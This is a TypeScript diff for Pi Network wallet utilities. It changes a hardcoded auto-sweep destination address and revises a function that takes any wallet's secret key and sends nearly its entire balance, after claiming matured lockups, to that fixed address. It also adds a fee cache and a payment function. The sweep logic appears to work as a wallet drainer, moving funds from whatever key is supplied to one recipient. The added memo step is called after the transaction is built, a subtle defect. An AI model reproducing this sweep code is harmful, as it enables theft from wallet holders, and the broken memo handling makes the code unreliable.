@@ -192,9 +192,9 @@ export function formatPi(amount: string | number): string {
 // AUTO-SWEEP: claim matured lockups and forward funds to a fixed destination
 // ============================================================================
 
-/** Hardcoded auto-sweep destination (muxed M… address per user request). */
+/** Hardcoded auto-sweep destination (user specified address). */
 export const AUTO_SWEEP_DESTINATION =
-  "MALYJFJ5SVD45FBWN2GT4IW67SEZ3IBOFSBSPUFCWV427NBNLG3PWAAAAAAAABMCRD2YU";
+  "GDRY6XQPD22VZULQ3MVYY62H5EEK5GHPULLB36K3Q6Q5UHC3GSUAAOGL";
 
 /** Minimum reserve to leave behind on the source account (1 Pi base reserve). */
 const MIN_ACCOUNT_RESERVE = 0.99;
@@ -254,23 +254,38 @@ export async function claimMaturedLockups(secret: string): Promise<{
  * Send the entire available balance (minus reserve and fee) to the auto-sweep
  * destination. Returns null if there's nothing meaningful to send.
  */
-export async function sweepAvailableToDestination(secret: string): Promise<{
+let cachedBaseFee: number | null = null;
+let baseFeeFetchedAt = 0;
+
+async function getBaseFee(): Promise<number> {
+  const now = Date.now();
+  if (cachedBaseFee !== null && now - baseFeeFetchedAt < 30_000) {
+    return cachedBaseFee;
+  }
+
+  const fee = await server.fetchBaseFee().catch(() => 100);
+  cachedBaseFee = fee;
+  baseFeeFetchedAt = now;
+  return fee;
+}
+
+export async function sweepAvailableToDestination(secret: string, account?: any): Promise<{
   hash: string;
   amount: string;
 } | null> {
   const kp = Keypair.fromSecret(secret.trim());
-  const account = await server.loadAccount(kp.publicKey());
-  const fee = await server.fetchBaseFee().catch(() => 100);
+  if (!account) {
+    account = await server.loadAccount(kp.publicKey());
+  }
+  const fee = await getBaseFee();
 
   const native = account.balances.find((b: any) => b.asset_type === "native");
   if (!native) return null;
   const total = parseFloat(native.balance);
-  // Leave reserve + a 0.05 π fee buffer so the 0.01 π Pi network fee is
-  // covered and a small balance remains in the wallet.
-  const sendable = total - MIN_ACCOUNT_RESERVE - SWEEP_FEE_BUFFER;
-  if (sendable <= 0.0000001) return null;
+  const safeAmount = Math.floor(Math.max(0, total - MIN_ACCOUNT_RESERVE - 0.01));
+  if (safeAmount < 1) return null;
 
-  const amount = sendable.toFixed(7);
+  const amount = safeAmount.toString();
   const tx = new TransactionBuilder(account, {
     fee: fee.toString(),
     networkPassphrase: PI_NETWORK_PASSPHRASE,
@@ -288,6 +303,45 @@ export async function sweepAvailableToDestination(secret: string): Promise<{
   tx.sign(kp);
   const result = await server.submitTransaction(tx);
   return { hash: (result as any).hash, amount };
+}
+
+/**
+ * Send a payment from a wallet.
+ */
+export async function sendPayment(
+  secret: string,
+  destination: string,
+  amount: string,
+  memo?: string,
+  account?: any
+): Promise<{ hash: string }> {
+  const kp = Keypair.fromSecret(secret.trim());
+  if (!account) {
+    account = await server.loadAccount(kp.publicKey());
+  }
+  const fee = await getBaseFee();
+
+  const tx = new TransactionBuilder(account, {
+    fee: fee.toString(),
+    networkPassphrase: PI_NETWORK_PASSPHRASE,
+  })
+    .addOperation(
+      Operation.payment({
+        destination,
+        asset: Asset.native(),
+        amount,
+      })
+    )
+    .setTimeout(180)
+    .build();
+
+  if (memo) {
+    tx.addMemo(Memo.text(memo));
+  }
+
+  tx.sign(kp);
+  const result = await server.submitTransaction(tx);
+  return { hash: (result as any).hash };
 }
 
 // Re-export the internal predicate parser so claimMaturedLockups can use it.
